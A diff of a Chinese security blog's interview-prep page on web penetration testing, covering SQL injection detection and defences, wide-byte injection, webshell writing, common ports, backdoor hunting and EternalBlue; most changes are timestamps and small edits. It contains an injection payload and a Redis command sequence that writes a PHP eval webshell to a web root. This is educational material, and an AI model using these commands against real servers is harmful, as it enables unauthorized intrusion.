@@ -30,7 +30,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/simg/captcha1.jpg">
 <meta property="article:published_time" content="2023-09-02T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-10-07T12:32:49.816Z">
+<meta property="article:modified_time" content="2023-10-19T06:55:45.951Z">
 <meta property="article:author" content="Bron">
 <meta property="article:tag" content="面试">
 <meta name="twitter:card" content="summary">
@@ -130,17 +130,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">57</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">59</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">75</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">77</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">183</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">184</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -225,7 +225,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-07 20:32:49" itemprop="dateModified" datetime="2023-10-07T20:32:49+08:00">2023-10-07</time>
+                <time title="修改时间：2023-10-19 14:55:45" itemprop="dateModified" datetime="2023-10-19T14:55:45+08:00">2023-10-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -278,11 +278,11 @@
 <h1 id="SQL注入与其它注入"><a href="#SQL注入与其它注入" class="headerlink" title="SQL注入与其它注入"></a>SQL注入与其它注入</h1><ol>
 <li>如何判断sql注入，有哪些方法？</li>
 </ol>
-<p>(1) 判断注入点是否存在。看页面的url是否存在某些参数，然后通过改变，把值变为 +1、-1、9999、1’、1” 等等，查看页面是否有异常变化。<br>(2) 尝试是否有宽字节注入。查看页面编码格式是否为GBK，如果是可以尝试用 <code>1%df&#39;</code> 查看页面变化。<br>(3) 尝试是否有二次注入。先将正常数据写入数据库，然后查看能否带出。<br>(4) 尝试能否从User-Agent, Referer, Cookie等地方注入。使用burp修改参数。<br>(4) 使用sqlmap检测。<br>(4) 通过DNSlog判断是否有传回值。</p>
+<p>(1) 判断注入点是否存在。看页面的url是否存在某些参数，然后通过改变，把值变为 +1、-1、9999、1’、1” 等等，查看页面是否有异常变化。<br>(2) 尝试是否有宽字节注入。查看页面编码格式是否为GBK，如果是可以尝试用 <code>1%df&#39;</code> 查看页面变化。<br>(3) 尝试是否有二次注入。先将正常数据写入数据库，然后查看能否带出。<br>(4) 尝试能否从User-Agent, Referer, Cookie等地方注入。使用burp修改参数。<br>(5) 使用sqlmap检测。<br>(6) 通过DNSlog判断是否有传回值。</p>
 <ol start="2">
-<li>如何判断sql注入漏洞成因？如何防范？注入方式有哪些？除了数据库数据，利用方式还有哪些？</li>
+<li>如何判断sql注入漏洞成因？如何防范？注入方式有哪些？除了数据库数据，利用方式还有哪些？注入漏洞防范方法</li>
 </ol>
-<p>当程序执行访问某些表等操作都会执行到sql语句进行调用，如果在此调用过程中，提交了不合法的数据，而数据库无法识别会报错。也就是一切数据都是有害的。<br>注入类型：联合，报错，二次，宽字节，布尔盲注，时间盲注，堆叠注入。<br>注入提交方式：GET, POST, User-Agent, Referer, Cookie, 文件头<br>利用方式：主要看数据库类型，如sqlserver可以进行命令执行，MySQL写shell有些可以执行命令环境要在Linux下。<br>防范： 1. 使用预编译语句。使用PDO需要注意不要将变量直接拼接到PDO语句中。所有查询语句都使用数据库提供的参数化查询接口，参数化语句使用参数而不是将用户输入变量嵌入到SQL语句中。2. 过滤特殊字符。对特殊字符编码或转义。3. 代码层要统一。尽量为utf-8，以免由于编码方式不同造成过滤模型被绕过。4. 数据类型要严格明确。如果是数字型就不允许输入数字以外的字符，在数据库中类型要明确为int。5. 严格限制网站用户的数据库操作权限。给用户提供仅仅能满足其工作的权限，从而最大限度地减少注入攻击对数据库的危害。6. 数据长度应该严格规定。能在一定程度上防止比较长的注入语句无法正确执行。7. 避免网站显示SQL错误信息，比如类型错误，字段不匹配等，防止攻击者利用这些错误信息进行一些判断。8. 过滤危险字符，例如：采用正则表达式匹配union, sleep, and, select, load_file等关键字，如果匹配到则终止运行。<br>加CDN，套waf</p>
+<p>当程序执行访问某些表等操作都会执行到sql语句进行调用，如果在此调用过程中，提交了不合法的数据，而数据库无法识别会报错。也就是一切数据都是有害的。<br>注入类型：联合，报错，二次，宽字节，布尔盲注，时间盲注，堆叠注入。<br>注入提交方式：GET, POST, User-Agent, Referer, Cookie, 文件头<br>利用方式：主要看数据库类型，如sqlserver可以进行命令执行，MySQL写shell有些执行命令环境要在Linux下。<br>防范：<br>1、使用预编译语句。使用PDO需要注意不要将变量直接拼接到PDO语句中。所有查询语句都使用数据库提供的参数化查询接口，参数化语句使用参数而不是将用户输入变量嵌入到SQL语句中。<br>2、过滤特殊字符。对特殊字符编码或转义。<br>3、代码层要统一。尽量为utf-8，以免由于编码方式不同造成过滤模型被绕过。<br>4、数据类型要严格明确。如果是数字型就不允许输入数字以外的字符，在数据库中类型要明确为int。<br>5、严格限制网站用户的数据库操作权限。给用户提供仅仅能满足其工作的权限，从而最大限度地减少注入攻击对数据库的危害。<br>6、数据长度应该严格规定。能在一定程度上防止比较长的注入语句无法正确执行。<br>7、避免网站显示SQL错误信息，比如类型错误，字段不匹配等，防止攻击者利用这些错误信息进行一些判断。<br>8、过滤危险字符，例如：采用正则表达式匹配union, sleep, and, select, load_file等关键字，如果匹配到则终止运行。<br>加CDN，套waf</p>
 <ol start="3">
 <li>为什么有的时候没有错误回显？</li>
 </ol>
@@ -290,7 +290,7 @@
 <ol start="4">
 <li>宽字节注入原理？如何利用宽字节注入漏洞？payload如何构造？</li>
 </ol>
-<p>宽字节注入的关键是GBK编码，窄字节占1位，宽字节占2位。利用字符组合形成宽字节，使目标字符逃逸。<br>payload构造方式： <code>?id=1%df&#39;</code> </p>
+<p>宽字节注入的关键是GBK编码，窄字节占1位，宽字节占2位。利用字符组合形成宽字节，使目标字符逃逸。<br>payload构造方式： <code>?id=1%df&#39;</code><br>根本原因：设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p>
 <ol start="5">
 <li>mysql的网站注入，5.0以上与5.0以下有什么区别？</li>
 </ol>
@@ -375,7 +375,7 @@
 </ol>
 <p>原理：见问题4<br>根本原因：设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p>
 <ol start="25">
-<li>sql如何写shell&#x2F;单引被过滤怎么办？</li>
+<li>sql如何写shell&#x2F;单引被过滤怎么办？SQL注入写shell（MySQL &amp; mssql &amp; oracle）sql注入如何拿getshell？sql注入，写shell的语句，除了into outfile还有什么MySQL的特性可以getshell</li>
 </ol>
 <p>sql写shell的前提条件：<br>1 需要知道网站的绝对路径<br>2 secure_file_priv的值为空<br>3 需要足够的权限<br>4 GPC关闭可使用单引号</p>
 <p>sql写shell的方式：<br>(1) 导出函数写shell</p>
@@ -444,7 +444,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip -p port    <span class="comment"># redis远程连接</span></span><br><span class="line">ip:port&gt; info              <span class="comment"># 列出信息</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html </span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php eval(<span class="variable">$_POST</span>[whoami]);?&gt;\r\n\r\n&quot;</span></span><br><span class="line"><span class="comment"># 用redis写入文件的会自带一些版本信息，如果不换行可能导致无法执行</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 
 <ol start="37">
-<li>SQL注入写shell（MySQL &amp; mssql &amp; oracle）</li>
+<li>SQL注入写shell（MySQL &amp; mssql &amp; oracle）sql注入如何拿getshell</li>
 </ol>
 <p>见问题25<br><a target="_blank" rel="noopener" href="http://www.kryst4l.cn/2022/09/05/Oracle%E5%92%8Cmssql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99shell/">Oracle和mssql数据库写shell</a></p>
 <ol start="38">
@@ -1082,7 +1082,7 @@
 <ol start="22">
 <li>渗透测试中常见的端口？</li>
 </ol>
-<p>文件共享服务端口：21(FTP), 22(SSH), 69(TFTP)<br>远程连接服务端口：22(SSH), 23(Telnet), 3389(RDP), 5900(VNC)<br>Web应用服务端口：53(DNS), (80, 443, 8080, 8443)(HTTP&#x2F;HTTPS)<br>数据库服务端口：1433(MSSQL), 1521(Oracle), 3306(MySQL), 5432(PostgreSQL)<br>邮件服务端口：25(SMTP), 110(POP3), 143(IMAP)<br><a target="_blank" rel="noopener" href="https://blog.51cto.com/jayjaydream/5850365">渗透测试入门15之常见端口安全测试</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333481.html">常见端口攻击方式</a></p>
+<p>文件共享服务端口：21(FTP), 22(SSH), 69(TFTP)<br>远程连接服务端口：22(SSH), 23(Telnet), 3389(RDP), 5900(VNC)<br>Web应用服务端口：53(DNS), (80, 443, 8080, 8443)(HTTP&#x2F;HTTPS), 7001(Weblogic)<br>数据库服务端口：1433(MSSQL), 1521(Oracle), 3306(MySQL), 5432(PostgreSQL), 27017(Mongodb)<br>邮件服务端口：25(SMTP), 110(POP3), 143(IMAP)<br><a target="_blank" rel="noopener" href="https://blog.51cto.com/jayjaydream/5850365">渗透测试入门15之常见端口安全测试</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333481.html">常见端口攻击方式</a></p>
 <ol start="23">
 <li>网站渗透流程</li>
 </ol>
@@ -1168,16 +1168,16 @@
 <ol start="38">
 <li>手工查找后门木马的小技巧</li>
 </ol>
-<p>1、首先最需要注意的地方是系统的启动项，可以在“运行”-输入“msconfig 命令” 在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，如果对电脑不是太熟悉建议使用 360 安全卫士的开机加速功能，来查看有无异常的可以启动项和服务项，因为在后门木马中大部分都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；</p>
+<p>1、首先最需要注意的地方是系统的启动项，可以在“运行”-输入“msconfig 命令” 在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，因为在后门木马中大部分都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；</p>
 <p>2、查看系统关键目录 system32 和系统安装目录 Windows 下的文件，xp 系统下两者默认路径分别是 C:\WINDOWS\system32 和 C:\WINDOWS\。然后最新修改的文件中有没有可疑的可执行文件或 dll 文件，这两个地方都是木马最喜欢的藏身的地方了（小提示：一定要设置显示所有的文件的文件夹哦）。</p>
-<p>3、观察网络连接是否存在异常，还有“运行”-“cmd”- <code>netstat -an</code> 查看有没有可疑或非正常程序的网络连接，如果对电脑不是很熟悉建议大家使用 360 的流量监控功能更加直观和方便，尤其注意一下远程连接的端口，如果有类似于 8000 等端口就要注意了，8000 是灰鸽子的默认端口，记得有一次自己就在后门木马测试中在网络连接中发现 8000 端口，当然意思不是说只要没有 8000 端口的网络连接就一定安全，因为 8000 端口只是灰鸽子上线的默认端口，并且端口是可以更改的。</p>
+<p>3、观察网络连接是否存在异常，还有“运行”-“cmd”- <code>netstat -an</code> 查看有没有可疑或非正常程序的网络连接，尤其注意一下远程连接的端口，如果有类似于 8000 等端口就要注意了，8000 是灰鸽子的默认端口，记得有一次自己就在后门木马测试的网络连接中发现 8000 端口，当然意思不是说只要没有 8000 端口的网络连接就一定安全，因为 8000 端口只是灰鸽子上线的默认端口，并且端口是可以更改的。</p>
 <p>通过以上方法，可以查找到电脑的一些可疑文件，如果确认无疑，就可以手工进行删除了。当然还可以借助杀毒软件的力量。如果你真的中了木马后门，不用慌。最好最彻底的方法是重装系统后，在安全模式下，利用最新病毒库的杀软进行查杀。</p>
 <ol start="39">
 <li>常见web安全漏洞</li>
 </ol>
 <p>sql注入，文件上传，xss，文件包含，CSRF，SSRF，XXE，SSTI，反序列化，RCE，目录穿越，逻辑漏洞，中间件。</p>
 <ol start="40">
-<li>永恒之蓝的漏洞原理是什么？怎么做到的？</li>
+<li>永恒之蓝的漏洞原理是什么？怎么做到的？ms17-010</li>
 </ol>
 <p>原理：攻击者可以通过发送一个特制的SMB请求，导致Windows内核中的SmbSessionNegotiate函数发生缓冲区溢出。攻击者可以利用该漏洞执行任意代码，从而获得对受感染系统的完全控制。<br>漏洞类型：缓冲区溢出。<br>漏洞危害：攻击者可以利用该漏洞执行任意代码，从而获得对受感染系统的完全控制。</p>
 <ol start="41">
@@ -1288,12 +1288,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/" rel="prev" title="面试准备之工具篇">
-      <i class="fa fa-chevron-left"></i> 面试准备之工具篇
+    <a href="/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="prev" title="面试准备之计算机基础篇">
+      <i class="fa fa-chevron-left"></i> 面试准备之计算机基础篇
     </a></div>
       <div class="post-nav-item">
-    <a href="/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AF%87/" rel="next" title="面试准备之密码学篇">
-      面试准备之密码学篇 <i class="fa fa-chevron-right"></i>
+    <a href="/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E6%B5%81%E9%87%8F%E7%AF%87/" rel="next" title="面试准备之流量篇">
+      面试准备之流量篇 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -1369,20 +1369,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">183</span>
+          <span class="site-state-item-count">184</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">75</span>
+        <span class="site-state-item-count">77</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">57</span>
+        <span class="site-state-item-count">59</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1440,13 +1440,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">565k</span>
+    <span title="站点总字数">580k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">8:34</span>
+    <span title="站点阅读时长">8:48</span>
 </div>
 
 <!--
